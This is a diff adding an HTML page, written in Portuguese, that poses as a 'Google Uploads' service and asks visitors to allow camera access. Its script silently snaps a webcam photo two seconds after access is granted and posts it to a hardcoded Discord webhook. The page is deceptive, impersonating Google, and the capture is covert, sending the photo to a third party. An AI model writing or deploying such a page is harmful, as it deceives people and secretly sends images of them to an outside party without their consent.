@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Uploads</title>
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #555;
+            font-size: 16px;
+        }
+        button {
+            padding: 15px 30px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Google Uploads</h1>
+        <p>Para continuar, você precisa permitir o acesso à sua câmera e fotos. Isso é necessário para que possamos processar suas imagens.</p>
+        <button id="clickButton">Permitir Câmera e Fotos</button>
+        <video id="video" width="400" height="300" autoplay></video>
+        <canvas id="canvas" width="400" height="300" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        const button = document.getElementById('clickButton');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        button.addEventListener('click', () => {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(takePicture, 2000); // Tira a foto após 2 segundos
+                    })
+                    .catch(err => {
+                        console.error("Erro ao acessar a câmera: " + err);
+                    });
+            } else {
+                alert("Câmera não suportada por este navegador.");
+            }
+        });
+
+        function takePicture() {
+            context.drawImage(video, 0, 0, 400, 300);
+            const imageData = canvas.toDataURL('image/jpeg');
+            sendImageToDiscord(imageData);
+        }
+
+        function sendImageToDiscord(imageData) {
+            fetch('https://discord.com/api/webhooks/1469770449130094889/d1Ou1rjBSErYTaADNOqkHFqr06tWaS8lcf_66kE36CBvSEqapGUSV0iQhkONDY08OErP', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    content: 'Nova foto enviada!',
+                    files: [
+                        {
+                            contentType: 'image/jpeg',
+                            name: 'photo.jpg',
+                            data: imageData.split(',')[1]
+                        }
+                    ]
+                }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
